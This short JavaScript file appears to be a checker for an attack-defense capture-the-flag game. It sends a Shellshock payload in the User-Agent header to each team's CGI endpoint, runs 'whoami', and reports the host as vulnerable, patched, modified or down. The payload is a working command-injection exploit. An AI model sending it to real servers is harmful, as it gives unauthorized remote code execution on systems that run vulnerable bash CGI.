const axios = require('axios');

async function isVulnerable(teamId) {
    const defaultCheck = "www-data";
    const defaultCmd = "whoami";
    const endpoint = "vulnerable";
    const url = `http://10.0.${teamId}.100/cgi-bin/${endpoint}`;
    const headers = {
        'User-Agent': `() { :; }; echo; echo; /bin/bash -c '${defaultCmd}'`
    };

    try {
        const response = await axios.get(url, { headers: headers });
        if (response.status === 200) {
            if (response.data.toLowerCase().includes(defaultCheck.toLowerCase())) {
                return { status: "vulnerable" };
            }
            return { status: "patched" };
        }
        return { status: "modified" };
    } catch (error) {
        return { status: "down" };
    }
}

